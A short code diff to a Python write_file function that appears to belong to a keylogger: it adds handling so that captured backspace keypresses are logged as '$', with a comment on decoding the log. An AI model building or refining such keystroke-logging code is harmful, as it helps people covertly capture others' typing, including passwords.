@@ -120,6 +120,8 @@ def write_file(keys):
                 f.write("\n")
             elif key == 'Key.space':#for space it will enter a space
                 f.write(key.replace("Key.space"," "))
+            elif key == 'Key.backspace':#for backspace it will enter a $
+                f.write(key.replace("Key.backspace","$")) # EX. well$come --> welcome (Actual word) , another example hellll$$$o --> helo (actual word) [hope it helps you to understand]
             elif key[:4] == word:#for others we just pass no need to store
                 pass
             else:#else for remaning words we write into the file.
